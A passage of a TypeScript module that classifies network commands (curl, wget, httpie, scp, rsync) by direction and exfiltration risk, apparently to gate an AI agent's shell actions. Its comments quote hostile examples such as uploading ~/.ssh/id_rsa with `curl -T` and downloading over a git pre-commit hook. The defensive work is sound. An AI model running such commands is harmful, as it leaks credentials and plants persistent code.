/**
 * Network programs: everything that moves bytes on or off this machine.
 *
 * The one question this module exists to answer is DIRECTION. `curl
 * https://example.com` reads the internet; `curl -T ~/.ssh/id_rsa
 * https://example.com` hands your private key to a stranger. Both are "curl
 * with a url" to a pattern matcher, and only one of them ends your week.
 *
 * Three rules run through the whole file:
 *
 *  - Anything that can push local bytes outward is `net.send` with
 *    `can-exfiltrate`, and the note names the file when we can see it.
 *  - Anything that wires a network socket to a program is `exec.remote` and
 *    irreversible: once a shell is on the wire, nothing downstream matters.
 *  - localhost is not the internet. A POST to 127.0.0.1:3000 is an agent
 *    poking its own dev server, and treating it like a public upload is how a
 *    tool trains people to click "allow" without reading.
 *
 * Every judgement sets `pathArgs: 'none'` and supplies explicit targets: urls,
 * `host:path` specs and `@file` payloads are not filesystem arguments, and
 * letting the automatic extractor guess at them produces nonsense paths. The
 * host targets are also what feeds "you have never contacted this domain
 * before", so they are recorded even for harmless lookups.
 */

import type { Judgement, KnowledgeCtx, ProgramKnowledge } from './types.js';
import { firstNonFlag, flagValue, hasFlag, hostOf, nonFlags } from './types.js';

type NetTarget = NonNullable<Judgement['targets']>[number];

// --- shared helpers --------------------------------------------------------

/**
 * Hostname from a url, a bare `host:port`, or an ip literal.
 *
 * `hostOf` only recognises a scheme-qualified url or a dotted name with a
 * letter tld, so on its own it misses the two forms an agent uses most against
 * a dev server (`127.0.0.1:8080`, `localhost:3000`) and mangles bracketed ipv6
 * by stopping at the first colon.
 */
function targetHost(arg: string): string | undefined {
  const v6 = /^(?:[a-z][a-z0-9+.-]*:\/\/)?(?:[^@/\s]*@)?\[([0-9a-f:.]+)\]/i.exec(arg);
  if (v6) return v6[1]!.toLowerCase();
  const viaUrl = hostOf(arg);
  if (viaUrl) return viaUrl;
  const bare =
    /^(?:[a-z][a-z0-9+.-]*:\/\/)?(?:[^@/\s]*@)?(\d{1,3}(?:\.\d{1,3}){3}|localhost)(?::\d+)?(?:[/?#]|$)/i.exec(arg);
  return bare ? bare[1]!.toLowerCase() : undefined;
}

/**
 * Hosts that never leave the machine.
 *
 * Private lan ranges (10.x, 192.168.x) are deliberately NOT here: those are
 * other people's machines on the same network, which is exactly the hop an
 * exfiltration takes first.
 */
function isLocalHost(host: string | undefined): boolean {
  if (!host) return false;
  const h = host.toLowerCase();
  if (h === 'localhost' || h === '0.0.0.0' || h === '::1' || h === '::') return true;
  if (h === 'host.docker.internal') return true;
  // `.localhost` is reserved for loopback, but an mdns `.local` name is a
  // DIFFERENT machine on the lan — the same hop 10.x and 192.168.x are kept out
  // of this list for. `curl -T ~/.ssh/id_rsa http://nas.local/` leaves.
  if (h.endsWith('.localhost')) return true;
  return /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(h);
}

/**
 * Is the far end off this machine?
 *
 * A target we could not parse into a host counts as remote. `hosts.some(...)`
 * on an empty list is `false`, which quietly turns "we have no idea where this
 * is going" into `reach: 'machine'` — the cheap-looking end of the scale, and
 * the wrong direction to be wrong in.
 */
function isRemote(hosts: string[], hadTarget: boolean): boolean {
  return hosts.length === 0 ? hadTarget : hosts.some((h) => !isLocalHost(h));
}

/**
 * Destinations that are not files. `-o /dev/null` is the standard way to ask
 * for a status code and nothing else; calling it a write outside the project is
 * how a tool earns a reputation for crying wolf.
 */
const NON_FILE_SINKS: ReadonlySet<string> = new Set([
  '-', '/dev/stdout', '/dev/stderr', '/dev/null', 'nul', 'NUL',
]);

/**
 * A host given as a bare argument rather than a url: `host`, `host:port`,
 * `user@host`. Used by the ssh tools, telnet and the diagnostics, whose
 * arguments are hostnames with no scheme to key off.
 *
 * Numbers are rejected: a stray `1` here is almost always the value of a
 * count or port option, and recording it as a host would poison the
 * "never contacted this domain before" history.
 */
function bareHost(arg: string): string | undefined {
  const viaUrl = targetHost(arg);
  if (viaUrl) return viaUrl;
  const m = /^(?:[^@\s]+@)?([a-z0-9][a-z0-9._-]*)(?::\d+)?$/i.exec(arg);
  if (!m) return undefined;
  const h = m[1]!.toLowerCase();
  return /^\d+$/.test(h) ? undefined : h;
}

function uniq(xs: string[]): string[] {
  return [...new Set(xs)];
}

function hostTarget(host: string): NetTarget {
  return { type: 'host', value: host };
}

/** A local file the command reads or writes, tagged with what it is. */
function pathTarget(ctx: KnowledgeCtx, raw: string): NetTarget {
  const abs = ctx.resolve(raw);
  return {
    type: 'path',
    value: abs || raw,
    // An argument we cannot resolve is treated as outside the workspace; a
    // wrong "outside" costs a prompt, a wrong "inside" costs a leak.
    inWorkspace: abs ? ctx.inWorkspace(abs) : false,
    secret: abs ? ctx.isSecret(abs) : false,
  };
}

function anySecret(ctx: KnowledgeCtx, raws: string[]): string | undefined {
  for (const r of raws) {
    const abs = ctx.resolve(r);
    if (abs && ctx.isSecret(abs)) return r;
  }
  return undefined;
}

/** How to name the far end in a sentence. */
function hostLabel(hosts: string[]): string {
  if (hosts.length === 0) return 'a url';
  if (hosts.length === 1) return hosts[0]!;
  return 'several hosts';
}

function joinNote(...parts: (string | undefined)[]): string {
  return parts.filter((p): p is string => !!p).join(', ');
}

// --- a tiny option parser shared by the flag-heavy programs ----------------

interface Parsed {
  /** Non-option arguments, in order. Urls, hosts, file paths, subcommands. */
  positionals: string[];
  /** Every option seen, normalised to `-x` or `--long`. */
  seen: Set<string>;
  /** Values collected per option, in order of appearance. */
  values: Map<string, string[]>;
}

/**
 * Walks argv knowing which options take a value, so that `-o out.json` does
 * not leave `out.json` looking like a url and `--post-file secrets.env` does
 * not leave `secrets.env` looking like one either. Getting this wrong is how a
 * classifier silently loses the most important argument in the command.
 */
function parseOpts(
  argv: string[],
  longWithValue: ReadonlySet<string>,
  shortWithValue: ReadonlySet<string>,
): Parsed {
  const positionals: string[] = [];
  const seen = new Set<string>();
  const values = new Map<string, string[]>();
  const push = (name: string, v: string | undefined): void => {
    seen.add(name);
    if (v === undefined) return;
    const list = values.get(name);
    if (list) list.push(v);
    else values.set(name, [v]);
  };

  let literal = false;
  for (let i = 1; i < argv.length; i++) {
    const a = argv[i]!;
    if (literal || a === '-' || !a.startsWith('-')) {
      positionals.push(a);
      continue;
    }
    if (a === '--') {
      literal = true;
      continue;
    }
    if (a.startsWith('--')) {
      const eq = a.indexOf('=');
      if (eq !== -1) {
        push(a.slice(0, eq), a.slice(eq + 1));
        continue;
      }
      if (longWithValue.has(a)) {
        push(a, argv[i + 1]);
        i++;
        continue;
      }
      push(a, undefined);
      continue;
    }
    // Bundled shorts: `-fsSL`, and glued values like `-d@payload.json`.
    for (let k = 1; k < a.length; k++) {
      const ch = a[k]!;
      if (!shortWithValue.has(ch)) {
        push('-' + ch, undefined);
        continue;
      }
      const glued = a.slice(k + 1);
      if (glued.length > 0) push('-' + ch, glued);
      else {
        push('-' + ch, argv[i + 1]);
        i++;
      }
      break;
    }
  }
  return { positionals, seen, values };
}

function sawOpt(p: Parsed, ...names: string[]): boolean {
  return names.some((n) => p.seen.has(n));
}

function optValues(p: Parsed, ...names: string[]): string[] {
  const out: string[] = [];
  for (const n of names) {
    const v = p.values.get(n);
    if (v) out.push(...v);
  }
  return out;
}

function optValue(p: Parsed, ...names: string[]): string | undefined {
  return optValues(p, ...names)[0];
}

/**
 * A fetch that lands on disk. Where it lands decides the capability: a
 * download into the project is ordinary, a download over `~/.bashrc` is not.
 */
function downloadJudgement(
  ctx: KnowledgeCtx,
  dests: string[],
  hosts: string[],
  note: string,
  scale: 'single' | 'many' | 'sweeping',
  extraTargets: NetTarget[] = [],
): Judgement {
  const paths = dests.map((d) => pathTarget(ctx, d));
  const overSecret = paths.some((t) => t.secret);
  // With no named destination the file lands in the current directory, so the
  // cwd decides whether this is a project write or a machine write.
  const outside =
    paths.length > 0
      ? paths.some((t) => !t.inWorkspace)
      : !ctx.inWorkspace(ctx.resolve('.') || ctx.cwd);
  const remote = hosts.some((h) => !isLocalHost(h));
  return {
    // A fetch that lands on disk is a WRITE, whatever the bytes came from.
    // `net.fetch` is the read-only capability, and using it here let
    // `curl -o .git/hooks/pre-commit https://…` past the persistence floor,
    // which only looks at the two `fs.write.*` classes.
    capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
    reach: remote ? 'network' : outside ? 'machine' : 'workspace',
    reversibility: overSecret ? 'irreversible' : outside ? 'hard' : 'easy',
    scale,
    note: overSecret
      ? `${note}, on top of a credential file`
      : outside
        ? `${note}, outside the project`
        : note,
    pathArgs: 'none',
    targets: [...hosts.map(hostTarget), ...paths, ...extraTargets],
  };
}

// --- curl ------------------------------------------------------------------

const CURL_LONG_WITH_VALUE: ReadonlySet<string> = new Set([
  '--data', '--data-raw', '--data-binary', '--data-ascii', '--data-urlencode', '--json',
  '--form', '--form-string', '--upload-file', '--output', '--output-dir', '--request',
  '--header', '--user', '--proxy-user', '--oauth2-bearer', '--url', '--referer', '--cookie',
  '--cookie-jar', '--user-agent', '--proxy', '--preproxy', '--noproxy', '--interface',
  '--connect-timeout', '--max-time', '--max-filesize', '--max-redirs', '--retry',
  '--retry-delay', '--retry-max-time', '--limit-rate', '--range', '--continue-at',
  '--cacert', '--capath', '--cert', '--cert-type', '--key', '--key-type', '--pass',
  '--ciphers', '--resolve', '--connect-to', '--dns-servers', '--unix-socket',
  '--config', '--netrc-file', '--write-out', '--dump-header', '--trace', '--trace-ascii',
  '--stderr', '--aws-sigv4', '--local-port', '--mail-from', '--mail-rcpt', '--proto',
  '--socks5', '--socks5-hostname', '--socks4', '--socks4a', '--doh-url',
  '--etag-compare', '--etag-save', '--create-file-mode', '--request-target',
  '--tlsuser', '--tlspassword', '--tlsauthtype', '--pinnedpubkey', '--service-name',
  '--speed-limit', '--speed-time', '--tls-max', '--tls13-ciphers', '--curves', '--libcurl',
]);

const CURL_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'A', 'b', 'c', 'C', 'd', 'D', 'E', 'e', 'F', 'H', 'K', 'm', 'o', 'P', 'Q', 'r',
  't', 'T', 'u', 'U', 'w', 'x', 'X', 'y', 'Y', 'z',
]);

const SENDING_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);

/**
 * Files referenced from a `-d`/`-F` payload.
 *
 * The two syntaxes differ and the difference matters: for `--data` only a
 * LEADING `@` reads a file, so `-d "user=@example.com"` is an email address
 * and not an upload of a file called example.com. For `--form` it is
 * `field=@path` (attach) or `field=<path` (inline the contents).
 *
 * `--data-urlencode` has a third grammar again: `@file` and `name@file` both
 * read a file, and the `name@file` spelling has no leading `@` to notice.
 */
function curlPayloadFiles(
  dataArgs: string[],
  formArgs: string[],
  urlencodeArgs: string[] = [],
): string[] {
  const out: string[] = [];
  for (const d of dataArgs) {
    if (d.startsWith('@') && d !== '@-') out.push(d.slice(1));
  }
  for (const f of formArgs) {
    const m = /=[@<]([^;,]+)/.exec(f);
    if (m && m[1] && m[1] !== '-') out.push(m[1]);
  }
  for (const u of urlencodeArgs) {
    const m = /^[^=@]*@(.+)$/.exec(u);
    if (m && m[1] && m[1] !== '-') out.push(m[1]);
  }
  return out;
}

/**
 * `httpieSyntax` is for `curlie`, which is curl's flags with httpie's argument
 * grammar: the body arrives as bare `name=value` items and the method as a
 * leading word, so nothing in argv looks like `-d` and the whole request reads
 * as a plain GET to the curl parser.
 */
function classifyCurl(argv: string[], ctx: KnowledgeCtx, httpieSyntax = false): Judgement {
  const p = parseOpts(argv, CURL_LONG_WITH_VALUE, CURL_SHORT_WITH_VALUE);
  const urls = [...p.positionals, ...optValues(p, '--url')];
  const hosts = uniq(urls.map(targetHost).filter((h): h is string => !!h));
  const remote = isRemote(hosts, urls.length > 0);

  // Only the positionals that are neither the method nor a url can be request
  // items; `example.com/x?a=b` contains an `=` and would otherwise read as one.
  const itemArgs = httpieSyntax
    ? p.positionals.filter(
        (a, i) => !(i === 0 && HTTP_METHODS.has(a.toUpperCase())) && targetHost(a) === undefined,
      )
    : [];
  const items = itemArgs.map(httpieItem);
  const itemFiles = items.map((i) => i.file).filter((f): f is string => !!f);
  const itemMethod = httpieSyntax ? (p.positionals[0] ?? '').toUpperCase() : '';

  const urlencodeArgs = optValues(p, '--data-urlencode');
  const dataArgs = optValues(
    p, '-d', '--data', '--data-raw', '--data-binary', '--data-ascii', '--data-urlencode', '--json',
  );
  const formArgs = optValues(p, '-F', '--form', '--form-string');
  const uploads = optValues(p, '-T', '--upload-file').filter((u) => u !== '-');
  const outputs = optValues(p, '-o', '--output').filter((o) => !NON_FILE_SINKS.has(o));
  const outputDir = optValue(p, '--output-dir');
  const method = (optValue(p, '-X', '--request') ?? '').toUpperCase();

  const insecure = sawOpt(p, '-k', '--insecure')
    ? 'without checking the server certificate'
    : undefined;
  const authHeader = optValues(p, '-H', '--header').some((h) =>
    /^\s*(authorization|cookie|x-api-key|proxy-authorization)\s*:/i.test(h),
  );
  const creds =
    sawOpt(p, '-u', '--user', '--proxy-user', '--oauth2-bearer', '--netrc-file', '-n', '--netrc') ||
    authHeader
      ? 'carrying credentials'
      : undefined;

  const hostTargets = hosts.map(hostTarget);

  // `-K file` moves the real options into a file we cannot see. Nothing else
  // in argv can be trusted to describe what this invocation does.
  if (sawOpt(p, '-K', '--config')) {
    return {
      capability: 'net.send',
      exposure: 'can-exfiltrate',
      opaque: true,
      note: 'takes its options from a config file, so what it sends is not visible here',
      pathArgs: 'none',
      targets: hostTargets,
    };
  }

  const payloadFiles = curlPayloadFiles(dataArgs, formArgs, urlencodeArgs);
  const sentFiles = uniq([...payloadFiles, ...itemFiles, ...uploads]);
  const sending =
    dataArgs.length > 0 ||
    formArgs.length > 0 ||
    uploads.length > 0 ||
    SENDING_METHODS.has(method) ||
    items.some((i) => i.body) ||
    SENDING_METHODS.has(itemMethod);

  if (sending) {
    const secret = anySecret(ctx, sentFiles);
    const where = hostLabel(hosts);
    const what = secret
      ? `uploads ${secret}, a credential file, to ${where}`
      : sentFiles.length === 1
        ? `uploads ${sentFiles[0]!} to ${where}`
        : sentFiles.length > 1
          ? `uploads ${sentFiles.length} files to ${where}`
          : method === 'DELETE'
            ? `asks ${where} to delete something`
            : `sends data to ${where}`;
    return {
      capability: 'net.send',
      // A file leaving the machine lands in somebody else's system; a plain
      // form post is still just traffic until we know what it did.
      reach: !remote ? 'machine' : sentFiles.length > 0 ? 'external' : 'network',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      scale: sentFiles.length > 1 ? 'many' : 'single',
      note: joinNote(what, insecure, creds),
      pathArgs: 'none',
      targets: [
        ...hostTargets,
        ...sentFiles.map((f) => pathTarget(ctx, f)),
        ...outputs.map((o) => pathTarget(ctx, o)),
      ],
    };
  }

  // `--remote-name-all` turns every url into an `-O`, and `-J` hands the
  // filename to the server's Content-Disposition header. Both write files with
  // names that are nowhere in argv.
  if (
    outputs.length > 0 ||
    outputDir !== undefined ||
    sawOpt(p, '-O', '--remote-name', '--remote-name-all', '-J', '--remote-header-name')
  ) {
    const dests = outputDir !== undefined ? [outputDir, ...outputs] : outputs;
    const j = downloadJudgement(
      ctx,
      dests,
      hosts,
      `downloads from ${hostLabel(hosts)} into a file`,
      urls.length > 1 ? 'many' : 'single',
    );
    if (sawOpt(p, '-J', '--remote-header-name')) j.opaque = true;
    j.note = joinNote(j.note, insecure, creds);
    return j;
  }

  return {
    capability: 'net.fetch',
    reach: remote ? 'network' : 'workspace',
    scale: urls.length > 1 ? 'many' : 'single',
    note: joinNote(`fetches ${hostLabel(hosts)}`, insecure, creds),
    pathArgs: 'none',
    targets: hostTargets,
  };
}

// --- wget ------------------------------------------------------------------

const WGET_LONG_WITH_VALUE: ReadonlySet<string> = new Set([
  '--output-document', '--output-file', '--directory-prefix', '--post-data', '--post-file',
  '--body-data', '--body-file', '--method', '--header', '--user', '--password',
  '--http-user', '--http-password', '--proxy-user', '--proxy-password', '--user-agent',
  '--referer', '--limit-rate', '--timeout', '--dns-timeout', '--connect-timeout',
  '--read-timeout', '--tries', '--wait', '--waitretry', '--quota', '--level',
  '--cut-dirs', '--input-file', '--domains', '--exclude-domains', '--accept', '--reject',
  '--accept-regex', '--reject-regex', '--regex-type', '--include-directories',
  '--exclude-directories', '--load-cookies', '--save-cookies', '--ca-certificate',
  '--ca-directory', '--certificate', '--certificate-type', '--private-key',
  '--private-key-type', '--secure-protocol', '--ciphers', '--hsts-file', '--netrc-file',
  '--execute', '--bind-address', '--warc-file', '--backups', '--start-pos',
  '--restrict-file-names', '--progress', '--local-encoding', '--remote-encoding',
]);

const WGET_SHORT_WITH_VALUE: ReadonlySet<string> = new Set([
  'O', 'o', 'P', 'i', 'a', 'A', 'R', 'D', 'e', 'U', 'T', 't', 'Q', 'w', 'B', 'I', 'X', 'l',
]);

function classifyWget(argv: string[], ctx: KnowledgeCtx): Judgement {
  const p = parseOpts(argv, WGET_LONG_WITH_VALUE, WGET_SHORT_WITH_VALUE);
  const urls = p.positionals;
  const hosts = uniq(urls.map(targetHost).filter((h): h is string => !!h));
  const remote = isRemote(hosts, urls.length > 0);
  const hostTargets = hosts.map(hostTarget);

  const insecure = sawOpt(p, '--no-check-certificate')
    ? 'without checking the server certificate'
    : undefined;
  const creds = sawOpt(p, '--user', '--password', '--http-user', '--http-password')
    ? 'carrying credentials'
    : undefined;

  const postFiles = optValues(p, '--post-file', '--body-file');
  const method = (optValue(p, '--method') ?? '').toUpperCase();
  const sending =
    postFiles.length > 0 ||
    sawOpt(p, '--post-data', '--body-data') ||
    SENDING_METHODS.has(method);

  if (sending) {
    const secret = anySecret(ctx, postFiles);
    const where = hostLabel(hosts);
    const what = secret
      ? `uploads ${secret}, a credential file, to ${where}`
      : postFiles.length > 0
        ? `uploads ${postFiles[0]!} to ${where}`
        : `sends data to ${where}`;
    return {
      capability: 'net.send',
      reach: !remote ? 'machine' : postFiles.length > 0 ? 'external' : 'network',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      note: joinNote(what, insecure, creds),
      pathArgs: 'none',
      targets: [...hostTargets, ...postFiles.map((f) => pathTarget(ctx, f))],
    };
  }

  // `--spider` asks whether the url exists and keeps nothing.
  if (sawOpt(p, '--spider')) {
    return {
      capability: 'net.fetch',
      reach: remote ? 'network' : 'workspace',
      note: joinNote(`checks whether ${hostLabel(hosts)} responds`, insecure),
      pathArgs: 'none',
      targets: hostTargets,
    };
  }

  const outDoc = optValue(p, '-O', '--output-document');
  // `-O -` streams to stdout and `-O /dev/null` throws the body away: the two
  // wget invocations that write nothing to disk.
  if (outDoc !== undefined && NON_FILE_SINKS.has(outDoc)) {
    return {
      capability: 'net.fetch',
      reach: remote ? 'network' : 'workspace',
      note: joinNote(`fetches ${hostLabel(hosts)} without keeping it`, insecure, creds),
      pathArgs: 'none',
      targets: hostTargets,
    };
  }

  const prefix = optValue(p, '-P', '--directory-prefix');
  const dests = [outDoc, prefix].filter((d): d is string => !!d);

  // Recursive fetches write an unbounded tree of files whose names come from
  // the remote server, not from this command line.
  const recursive = sawOpt(
    p, '-r', '--recursive', '-m', '--mirror', '-p', '--page-requisites',
  );
  if (recursive) {
    const j = downloadJudgement(
      ctx,
      dests,
      hosts,
      `mirrors ${hostLabel(hosts)}, creating however many files the server offers`,
      'sweeping',
    );
    j.note = joinNote(j.note, insecure, creds);
    return j;
  }

  // `-i list.txt` pulls the url list out of a file, so the hosts contacted are
  // not visible in argv.
  const inputFile = optValue(p, '-i', '--input-file');
  if (inputFile !== undefined) {
    const j = downloadJudgement(
      ctx,
      dests,
      hosts,
      'downloads every url listed in a file',
      'many',
      [pathTarget(ctx, inputFile)],
    );
    j.opaque = true;
    j.note = joinNote(j.note, insecure, creds);
    return j;
  }

  const j = downloadJudgement(
    ctx,
    dests,
    hosts,
    `downloads ${hostLabel(hosts)} to a file`,
    urls.length > 1 ? 'many' : 'single',
  );
  j.note = joinNote(j.note, insecure, creds);
  return j;
}

// --- httpie (and the http-compatible clones) -------------------------------

const HTTPIE_LONG_WITH_VALUE: ReadonlySet<string> = new Set([
  '--auth', '--auth-type', '--session', '--session-read-only', '--print', '--output',
  '--style', '--pretty', '--format-options', '--proxy', '--cert', '--cert-key',
  '--cert-key-pass', '--verify', '--ssl', '--ciphers', '--timeout', '--max-redirects',
  '--max-headers', '--default-scheme', '--response-charset', '--response-mime',
]);

const HTTPIE_SHORT_WITH_VALUE: ReadonlySet<string> = new Set(['a', 'A', 'o', 'p', 's']);

const HTTP_METHODS = new Set([
  'GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT',
]);

/** A request item that carries a body, and the file it pulls in if any. */
function httpieItem(item: string): { body: boolean; file?: string } {
  // `name==value` is a query parameter, not a body field.
  if (/^[^=:\s]+==/.test(item)) return { body: false };
  const m = /^[^=:\s]+(?::=@|=@|@)(.+)$/.exec(item);
  if (m) return { body: true, file: m[1]! };
  if (/^[^=:\s]+:?=/.test(item)) return { body: true };
  return { body: false };
}

function classifyHttpie(argv: string[], ctx: KnowledgeCtx): Judgement {
  const p = parseOpts(argv, HTTPIE_LONG_WITH_VALUE, HTTPIE_SHORT_WITH_VALUE);
  const pos = [...p.positionals];
  const first = pos[0];
  const method = first && HTTP_METHODS.has(first.toUpperCase()) ? first.toUpperCase() : '';
  if (method) pos.shift();
  const url = pos.shift();
  // httpie's `:8000/api` and `:/api` shorthands mean localhost, and they are
  // the single most common way an agent talks to its own dev server.
  const urlHost = url ? (url.startsWith(':') ? 'localhost' : targetHost(url)) : undefined;
  const hosts = urlHost ? [urlHost] : [];
  const remote = isRemote(hosts, url !== undefined);
  const hostTargets = hosts.map(hostTarget);

  const items = pos.map(httpieItem);
  const files = items.map((i) => i.file).filter((f): f is string => !!f);
  // httpie switches to POST on its own as soon as a body item is present, so
  // an explicit method is not required for this to be a send.
  const sending = items.some((i) => i.body) || SENDING_METHODS.has(method);

  const insecure = /^(no|false)$/i.test(optValue(p, '--verify') ?? '')
    ? 'without checking the server certificate'
    : undefined;
  // httpie takes headers as bare `Name:value` items, so the auth flags are not
  // the only way a token rides along.
  const creds =
    sawOpt(p, '-a', '--auth', '--auth-type') ||
    pos.some((i) => /^\s*(authorization|cookie|x-api-key|proxy-authorization)\s*:[^=]/i.test(i))
      ? 'carrying credentials'
      : undefined;

  // `--offline` builds the request and prints it instead of sending it.
  if (sawOpt(p, '--offline')) {
    return {
      capability: 'exec.inspect',
      note: 'builds a request and prints it without sending it',
      pathArgs: 'none',
      targets: hostTargets,
    };
  }

  if (sending) {
    const secret = anySecret(ctx, files);
    const where = hostLabel(hosts);
    const what = secret
      ? `uploads ${secret}, a credential file, to ${where}`
      : files.length > 0
        ? `uploads ${files[0]!} to ${where}`
        : `sends data to ${where}`;
    return {
      capability: 'net.send',
      reach: !remote ? 'machine' : files.length > 0 ? 'external' : 'network',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      scale: files.length > 1 ? 'many' : 'single',
      note: joinNote(what, insecure, creds),
      pathArgs: 'none',
      targets: [...hostTargets, ...files.map((f) => pathTarget(ctx, f))],
    };
  }

  // `-o /dev/null` is a status check, not a download, so it must not be enough
  // on its own to call this a write.
  const dests = optValues(p, '-o', '--output').filter((o) => !NON_FILE_SINKS.has(o));
  if (dests.length > 0 || sawOpt(p, '-d', '--download', '--continue')) {
    const j = downloadJudgement(ctx, dests, hosts, `downloads ${hostLabel(hosts)} to a file`, 'single');
    j.note = joinNote(j.note, insecure, creds);
    return j;
  }

  return {
    capability: 'net.fetch',
    reach: remote ? 'network' : 'workspace',
    note: joinNote(`fetches ${hostLabel(hosts)}`, insecure, creds),
    pathArgs: 'none',
    targets: hostTargets,
  };
}

// --- file movers: scp, rsync, sftp, ftp, aria2c, croc ----------------------

/**
 * The `[user@]host:path` form, which is the only thing separating an upload
 * from a local copy. A windows drive letter looks identical and is not a host.
 */
function remoteSpec(arg: string): { host: string; path: string } | undefined {
  const url = /^(?:scp|sftp|rsync|ssh|ftp|ftps):\/\/(?:[^@/]*@)?([^/:?#]+)(?::\d+)?(\/.*)?$/i.exec(arg);
  if (url) return { host: url[1]!.toLowerCase(), path: url[2] ?? '' };
  if (/^[a-z]:[\\/]/i.test(arg)) return undefined;
  const m = /^(?:[^@:/\\\s]+@)?([a-z0-9._-]+):(.*)$/i.exec(arg);
  if (!m) return undefined;
  return { host: m[1]!.toLowerCase(), path: m[2] ?? '' };
}

const SCP_SHORT_WITH_VALUE: ReadonlySet<string> = new Set(['P', 'o', 'i', 'l', 'c', 'F', 'S', 'J']);

const RSYNC_LONG_WITH_VALUE: ReadonlySet<string> = new Set([
  '--rsh', '--rsync-path', '--exclude', '--exclude-from', '--include', '--include-from',
  '--files-from', '--filter', '--log-file', '--log-file-format', '--temp-dir',
  '--backup-dir', '--suffix', '--compare-dest', '--copy-dest', '--link-dest', '--chmod',
  '--chown', '--usermap', '--groupmap', '--timeout', '--contimeout', '--port', '--bwlimit',
  '--partial-dir', '--out-format', '--password-file', '--info', '--debug', '--max-size',
  '--min-size', '--block-size', '--modify-window', '--sockopts', '--protocol', '--iconv',
  '--checksum-seed', '--skip-compress', '--write-batch', '--read-batch', '--address',
  '--compress-level', '--remote-option', '--outbuf',
]);

const RSYNC_SHORT_WITH_VALUE: ReadonlySet<string> = new Set(['e', 'f', 'B', 'T', 'M', '_']);

interface Transfer {
  sources: string[];
  dest: string | undefined;
}

function splitTransfer(positionals: string[]): Transfer {
  if (positionals.length < 2) return { sources: positionals, dest: undefined };
  return { sources: positionals.slice(0, -1), dest: positionals[positionals.length - 1] };
}

function classifyCopier(name: string, argv: string[], ctx: KnowledgeCtx): Judgement {
  const isRsync = name === 'rsync';
  const p = isRsync
    ? parseOpts(argv, RSYNC_LONG_WITH_VALUE, RSYNC_SHORT_WITH_VALUE)
    : parseOpts(argv, new Set<string>(), SCP_SHORT_WITH_VALUE);
  const { sources, dest } = splitTransfer(p.positionals);
  const destSpec = dest ? remoteSpec(dest) : undefined;
  const srcSpecs = sources.map(remoteSpec).filter((s): s is { host: string; path: string } => !!s);
  const localSources = sources.filter((s) => !remoteSpec(s));
  const recursive = sawOpt(p, '-r', '-R', '--recursive', '-a', '--archive');

  // `-e ssh ...` / `--rsh` hands rsync an arbitrary command to run for the
  // connection, which is a program execution hiding inside a file copy. scp
  // has the same hole twice over: `-S prog` names the transfer program and
  // `-o ProxyCommand=…` is a shell line ssh runs before it connects.
  const rsh =
    (isRsync && sawOpt(p, '-e', '--rsh', '--rsync-path')) ||
    (!isRsync &&
      (sawOpt(p, '-S') ||
        optValues(p, '-o').some((o) => /^proxy(command|jump|usefdpass)=/i.test(o))))
      ? 'using a custom remote shell command'
      : undefined;
  // `--del` is rsync's own alias for `--delete-during`, so a `--delete` prefix
  // test misses it entirely.
  const deleting =
    isRsync && argv.some((a, i) => i > 0 && (a.startsWith('--delete') || a === '--del'));
  // `--remove-source-files` deletes the LOCAL side once each file is across,
  // which no amount of reading the destination will tell you.
  const removingSources = isRsync && argv.some((a, i) => i > 0 && a === '--remove-source-files');

  if (destSpec) {
    const secret = anySecret(ctx, localSources);
    const local = isLocalHost(destSpec.host);
    const what = secret
      ? `uploads ${secret}, a credential file, to ${destSpec.host}`
      : `copies files to ${destSpec.host}, off this machine`;
    return {
      capability: 'net.send',
      reach: local ? 'machine' : 'external',
      exposure: 'can-exfiltrate',
      reversibility: 'irreversible',
      scale: recursive ? 'sweeping' : localSources.length > 1 ? 'many' : 'single',
      note: joinNote(
        what,
        deleting ? 'and deletes files there that are missing locally' : undefined,
        removingSources ? 'and deletes the local copies once they are across' : undefined,
        rsh,
      ),
      pathArgs: 'none',
      targets: [hostTarget(destSpec.host), ...localSources.map((s) => pathTarget(ctx, s))],
    };
  }

  if (srcSpecs.length > 0) {
    const hosts = uniq(srcSpecs.map((s) => s.host));
    // A pull with --delete wipes local files that the remote does not have,
    // which is a deletion first and a download second.
    if (deleting) {
      const t = dest ? pathTarget(ctx, dest) : undefined;
      return {
        capability: 'fs.delete',
        reach: t && !t.inWorkspace ? 'machine' : 'workspace',
        reversibility: 'irreversible',
        scale: 'sweeping',
        note: joinNote(
          `downloads from ${hostLabel(hosts)} and deletes local files that are missing there`,
          rsh,
        ),
        pathArgs: 'none',
        targets: [...hosts.map(hostTarget), ...(t ? [t] : [])],
      };
    }
    const j = downloadJudgement(
      ctx,
      dest ? [dest] : [],
      hosts,
      `copies files from ${hostLabel(hosts)} onto this machine`,
      recursive ? 'sweeping' : 'single',
    );
    j.note = joinNote(j.note, rsh);
    return j;
  }

  // Neither end named a host: this is a local copy wearing a network tool's
  // name.
  const destTarget = dest ? pathTarget(ctx, dest) : undefined;
  const outside = destTarget ? !destTarget.inWorkspace : true;
  if (deleting || removingSources) {
    return {
      capability: 'fs.delete',
      // `--remove-source-files` empties the SOURCE side, so the sources decide
      // how far this reaches even when the destination is inside the project.
      reach: outside || (removingSources && sources.some((s) => !pathTarget(ctx, s).inWorkspace))
        ? 'machine'
        : 'workspace',
      reversibility: 'irreversible',
      scale: 'sweeping',
      note: removingSources
        ? 'copies files locally and then deletes the originals'
        : 'copies files locally and deletes anything at the destination that is not in the source',
      pathArgs: 'none',
      targets: [...sources.map((s) => pathTarget(ctx, s)), ...(destTarget ? [destTarget] : [])],
    };
  }
  return {
    capability: outside ? 'fs.write.outside' : 'fs.write.workspace',
    reach: outside ? 'machine' : 'workspace',
    scale: recursive ? 'sweeping' : 'many',
    note: 'copies files from one place on this machine to another',
    pathArgs: 'none',
    targets: [...sources.map((s) => pathTarget(ctx, s)), ...(destTarget ? [destTarget] : [])],
  };
}

/** Interactive transfer clients: the session, not argv, decides direction. */
function classifyInteractiveTransfer(argv: string[]): Judgement {
  const hosts = uniq(
    nonFlags(argv)
      .map((a) => remoteSpec(a)?.host ?? bareHost(a))
      .filter((h): h is string => !!h),
  );
